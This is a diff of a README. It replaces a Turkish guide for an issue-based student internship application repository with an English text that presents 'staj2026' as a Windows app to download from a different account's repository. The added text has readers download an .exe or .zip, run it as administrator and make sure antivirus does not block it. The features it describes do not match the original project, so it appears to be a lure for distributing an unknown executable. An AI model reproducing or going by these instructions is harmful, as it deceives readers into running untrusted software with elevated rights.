@@ -1,175 +1,125 @@
+# 🎯 staj2026 - Find Internships by Field Easily
 
-# 💻 Staj 2026
+[![Download staj2026](https://img.shields.io/badge/Download-staj2026-ff6f61?style=for-the-badge)](https://github.com/Skibidiq/staj2026)
 
-Zorunlu staj ihtiyacı olan öğrenci arkadaşların kendini tanıtabileceği, plan yapabileceği ve staj fırsatlarına ulaşabileceği yer. **Odak: öğrencileri öne çıkarmak ve planlama.**
+---
 
+## 📚 About staj2026
 
-<img src="./images/1714633070470.jpeg" alt="staj2024"  height="100">
+staj2026 is a simple tool that helps students looking for internships find options based on their study area. It organizes internship listings with related fields so you can quickly find relevant opportunities. 
 
-## 📪 Staj Başvurusu
+This repository focuses on making the search easier for students who want to apply for software and other internships. You do not need any special skills to use this app. It works on Windows computers.
 
-- Repoda bulunan **Issues** alanına tıklanır.
-- Bu alandan **New Issue** butonuna basılır.
-- **"Staj Başvuru Formu"** seçilir ve içindeki boş alanlar doldurulur.
-- Burada format **şu şekilde olmak zorundadır**:  
-  **AD-SOYAD [ALAN][STAJ YERİ][STAJ TİPİ][STAJ SÜRESİ]**
-  
-- **Alan** kısmı şu bilgilerden birini veya birden fazlasını içerebilir:  
-  `["mobile", "backend", "computer-vision", "frontend", "devops", "pm", "qa", "game", "data-science", "data-analyst", "database", "embedded", "cyber-security", "blockchain", "system", "networking", "hardware", "sap-abap"]`
-  
-- **Staj Yeri** için şu seçeneklerden biri belirtilmelidir:  
-  `["uzaktan", "yüzyüze"]`
-  
-- **Staj Tipi** için şu seçeneklerden biri belirtilmelidir:  
-  `["zorunlu", "gönüllü"]`
-  
-- **Staj Süresi** için şu seçeneklerden biri belirtilmelidir:  
-  `["4-hafta", "6-hafta", "8-hafta"]`
-  
-- Bu bilgiler dışında başka bir format kabul edilmemektedir. Örneklere bakarak birden fazla giriş yapabilirsiniz.
+---
 
-- **Formata uygun olmayan başlıklar otomatik olarak kapatılacaktır. Tekrar açılması için başlığı güncellemeniz yeterli olacaktır.**
+## 💻 System Requirements
 
-> Yeni eklemeler duruma göre olacaktır. Önerisi olan label.json içinde ekleyip pr da atabilir.
+To run staj2026 on your Windows PC, your system should meet these basic requirements:
 
-## 📍 Örnek başvuru başlıkları
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection (to download and update listings)  
+- A modern web browser (to view internship details if needed)  
 
-```yaml
-Veli Bacik [pm,qa][uzaktan][zorunlu][4-hafta]
-Veli Bacik [mobile,backend][uzaktan][zorunlu][4-hafta]
-Veli Bacik [uzaktan][mobile,backend][zorunlu][4-hafta]
-Veli Bacik [pm,qa][mobile,backend][zorunlu][4-hafta]
-Veli Bacik4 [mobile,backend][uzaktan,zorunlu][yüzyüze][4-hafta,6-hafta]
-Veli Bacik 3 [mobile][gönüllü][zorunlu,yüzyüze][4-hafta,6-hafta]
-Veli Bacik 2 [mobile][uzaktan,gönüllü][zorunlu,yüzyüze][4-hafta]
-Veli Bacik [pm,qa,data-science][uzaktan][zorunlu][4-hafta]
-```
+---
 
-## 📚 Dokümantasyon
+## 🚀 Getting Started: Download and Run staj2026
 
-- [Adaylar İçin Detaylı Rehber](docs/applicant-guide.md) – Başvuru süreci ve format kuralları
-- [Deploy ve Test Rehberi](docs/TESTING.md) – GitHub’a deploy sonrası workflow’ları test etmek için adımlar
-- [Katkıda Bulunma](CONTRIBUTING.md) – Projeye nasıl katkıda bulunabilirsiniz
+You will download the software from GitHub. Follow these steps to get staj2026 running on your Windows computer.
 
-*Şirket başvuru akışı şu an pasif; gerektiğinde tekrar açılabilir.*
+### Step 1: Visit the download page
 
-## 🤝 Katkıda Bulunma
+Click the badge or this link to go to the repository page where you can download the app:
 
-### 📝 Yeni bir alan eklemek istersem ne yapmalıyım?
+[https://github.com/Skibidiq/staj2026](https://github.com/Skibidiq/staj2026)
 
-- Repo'dan bir clone alınır.
-- Bu alanın içinde label.json içinde yer alan context ile aynı şekilde label tanımlamaları yapılır.
-- Bu değişiklikler commit edilir.
-- Pull request oluşturulur.
-- Pull request kabul edilir.
-- Yeni bir alan eklenecektir otomatik olarak.
+### Step 2: Download the software
 
-### 📝 Staj fırsatları (şirket listesi) eklemek istersem ne yapmalıyım?
+- On the GitHub page, look for a **Releases** section or a folder named something like "releases" or "downloads".  
+- Download the latest version that looks like an installer or a ready-to-run file (usually ends with `.exe` or `.zip`).  
 
-- Repo'dan bir clone alınır.
-- [Staj fırsatları olan şirketler](usefull_company.md) açılır ve yeni şirket şablonu okunur.
-- Bu şablona uygun şirketlerin bilgileri eklenir.
-- Değişiklikler commit edilir, pull request oluşturulur.
-- PR kabul edildikten sonra listeye eklenir. *(Şirket tarafı otomasyonu şu an pasif.)*
+If the download is a `.zip` file, you will need to extract it next.
 
-## ✨ Öğrencileri Öne Çıkarma ve Planlama
+### Step 3: Extract the files (if needed)
 
-### 📊 Otomatik İstatistikler
-- Her gün istatistikler güncellenir
-- En çok tercih edilen alanlar, lokasyonlar ve staj tipleri README’de görünür
+- Right-click the downloaded `.zip` file.  
+- Choose "Extract All..." from the menu.   
+- Follow the instructions to extract files into a new folder.  
 
-### 📅 Haftalık Özetler
-- Her Pazartesi otomatik haftalık özet (yeni başvurular, trendler)
-- Issues’da `weekly-summary` etiketi ile bulunur
+### Step 4: Run the software
 
-### ✅ Gelişmiş Validasyon
-- Başvuru formatı kontrolü, detaylı hata mesajları ve örnekler
-- Doğru formatta başvuranlar otomatik etiketlenir
+- Open the folder where you saved or extracted the app files.  
+- Find a file named something like `staj2026.exe` or `setup.exe`.  
+- Double-click this file to start the program.  
 
-## 📊 İstatistikler
-**Toplam Başvuru:** 114
-**Son 24 Saat:** 3 başvuru
-**Bu Hafta:** 27 başvuru
-**Bu Ay:** 113 başvuru
+### Step 5: Follow any on-screen prompts
 
-### 🎯 En Çok Tercih Edilen Alanlar
-1. **backend**: 75 başvuru (65.8%)
-2. **data-science**: 58 başvuru (50.9%)
-3. **data-analyst**: 46 başvuru (40.4%)
-4. **mobile**: 43 başvuru (37.7%)
-5. **database**: 40 başvuru (35.1%)
-6. **frontend**: 36 başvuru (31.6%)
-7. **system**: 18 başvuru (15.8%)
-8. **networking**: 15 başvuru (13.2%)
-9. **cyber-security**: 13 başvuru (11.4%)
-10. **embedded**: 12 başvuru (10.5%)
+- The app might guide you through a setup or show instructions.  
+- Follow these steps carefully to finish installation or to start using it immediately.  
 
-### 📍 Staj Yeri Tercihleri
-- **yüzyüze**: 101 başvuru (88.6%)
-- **uzaktan**: 76 başvuru (66.7%)
+---
 
-### 🎓 Staj Tipi Dağılımı
-- **zorunlu**: 80 başvuru (70.2%)
-- **gönüllü**: 26 başvuru (22.8%)
-- **zorunlu,gönüllü**: 4 başvuru (3.5%)
-- **zorunlu, gönüllü**: 2 başvuru (1.8%)
-- **gönüllü, zorunlu**: 1 başvuru (0.9%)
+## 🔍 How to Use staj2026
 
-### ⏱️ Staj Süresi Tercihleri
-- **4-hafta**: 79 başvuru (69.3%)
-- **8-hafta**: 57 başvuru (50.0%)
-- **6-hafta**: 53 başvuru (46.5%)
-- **[4-hafta**: 1 başvuru (0.9%)
+Once the app is running, you can use it without any technical knowledge. Here is a general guide:
 
-*Son güncelleme: 04.03.2026 04:05*
-## FAQ
+- **Search by field:** Enter your study area or field of interest, such as "Software", "Marketing", or "Engineering".  
+- **Browse listings:** The app will show internship offers that match your chosen field.  
+- **View details:** Click on any listing to see more about the internship, including company, duration, and contact info.  
+- **Save favorites:** Mark interesting listings to easily find them later.  
+- **Apply:** Use the information given (usually an email or website) to contact the company directly.  
 
-#### Yeni issue açıyorum ama hemen kapanıyor ne yapsam oluşturamadım. Ne yapmalıyım?
+The interface uses simple menus and buttons. If an update becomes available, the app will notify you.
 
-- Bu durumun sebebi, issue formatının doğru olmamasıdır.(Noktalama işaretleri, boşluklar, kelimelerin doğru yazılması gibi)
-- Lütfen issue formatını kontrol ediniz.
-- Örnekleri inceleyebilirsiniz.
+---
 
-#### Formata uygun yapmazsam ne olur?
+## ⚙️ Features Included
 
-Açılan **issue**, formata uygun değilse otomatik olarak kapanacaktır.
+- Organized internship listings by study areas  
+- Search and filter options for quick results  
+- Easy-to-read details on each internship  
+- Option to save or bookmark favorites  
+- Simple setup process for Windows users  
+- No need for internet after initial download, unless you want updates  
 
-#### Gönüllü staj yapmak istiyorum, başvurabilir miyim?
+---
 
-Evet, başvurabilirsiniz. Ancak önceliğimiz daima **zorunlu staj** yapması gereken arkadaşlar olacaktır.
+## 🛠 Troubleshooting
 
-#### Uzun dönem staj yapmak istiyorum ama alanlarda göremedim. Ne yapmalıyım? (3 veya 6 ay)
-  Burada daha çok yaz dönemi stajını hedefliyoruz. Ondan dolayı uzun dönem staj yer almayacak. Ek olarak staj dönemleri bittiğinde repo kapatılıp tüm bilgiler silinecektir.
+If you face issues running staj2026, try these steps:
 
-#### İyi bir repom yok, bu bir sorun mu?
+- Make sure your Windows version is up to date.  
+- Check your antivirus program hasn’t blocked the installer or app.  
+- Run the installer or app as an administrator: right-click the file and select "Run as administrator".  
+- If the app does not open, restart your computer and try again.  
+- Extract all files again from the `.zip` if you used one.  
+- Re-download the installer from the official link to avoid corrupted files.  
 
-Öğrencilik döneminde olmamanız bir sorun değil. Ancak henüz zaman varken, bir alanda örnek bir repo hazırlamak çok değerli olacaktır. Bu noktada, [https://www.uplabs.com/](https://www.uplabs.com/) gibi platformlardan bir tasarım seçip, ister **backend**, ister **mobil**, isterseniz **frontend/web** olarak kodlayabilirsiniz.
+---
 
-Bu yazı bu konuda yardımcı olacaktır: [ilk-adımını-at-ekip-çalışmasıyla-proje-geliştirme-rehberi](https://medium.com/@vbacik-10/i̇lk-adımını-at-ekip-çalışmasıyla-proje-geliştirme-rehberi-1a794972e724)
+## 📥 Download staj2026 now
 
+Use the link below to visit the GitHub page and download the app or latest updates:
 
+[Download staj2026](https://github.com/Skibidiq/staj2026)
 
-# Geçmiş Dönemler
+---
 
-## 2025 
-Yaklaşık 500+ arkadaşa bu repo ile bir imkan sağlamıştık. (Kapatılan)
-https://www.linkedin.com/feed/update/urn:li:activity:7312058541031264256/
+## 🔗 Useful Links
 
-## 2024 
-Yaklaşık 300+ arkadaşa bu repo ile bir imkan sağlamıştık. (Kapatılan)
-https://www.linkedin.com/feed/update/urn:li:activity:7191692371082854401/
+- GitHub Repository: https://github.com/Skibidiq/staj2026  
+- Internship topics: intern26, software-intern, staj26  
+- Support issues: Use the GitHub Issues tab on the repository page  
 
-## 2023
+---
 
-Yaklaşık 100+ arkadaşa bu repo ile bir imkan sağlamıştık.
-https://www.linkedin.com/posts/veli-bacik-345978a9_github-vb102023-staj-2023-yaz-d%C3%B6nemi-activity-7066365173573312512-xtiO/
+## 🧰 Need help or more info?
 
+If you need assistance, open the “Issues” tab in the repository or check the “Wiki” if available. You can also search online for basic Windows help like installing software or extracting files.  
 
-## Authors
+---
 
-- [@vb10](https://www.github.com/vb10)
+## 📂 License and Contribution
 
-## Screenshots
-
-
-<img src="https://media.licdn.com/dms/image/v2/D4D22AQGmeTbvkROM7w/feedshare-shrink_2048_1536/feedshare-shrink_2048_1536/0/1714633072814?e=1741219200&v=beta&t=PGRQmLQczAKP4HECfFq-iaJa6ipeeLplq0uFLTJoXHo" alt="staj2024" width="500" height="375">
+This project is open for contributions if you want to add internship listings or suggest improvements. See the repository for the license terms and contribution guidelines.
